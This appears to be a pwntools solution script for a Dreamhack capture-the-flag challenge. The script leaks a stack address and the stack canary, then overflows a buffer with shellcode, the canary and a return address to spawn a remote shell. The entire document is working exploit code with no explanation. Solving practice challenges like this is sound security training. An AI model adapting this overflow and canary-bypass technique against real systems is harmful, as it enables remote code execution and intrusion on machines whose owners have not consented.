from pwn import *
context.arch = "amd64"
p=remote("host1.dreamhack.games",13892)
p.recvuntil("buf: ")
buf=int(p.recv(14),16)
payload=b'A'*89
p.sendafter("Input: ",payload)
p.recvuntil(payload)
canary=u64(b'\x00'+p.recvn(7))
shell=asm(shellcraft.sh())
shellcode=shell.ljust(88,b'A')+p64(canary)+8*b'A'+p64(buf)
p.sendlineafter("Input: ",shellcode)
p.interactive()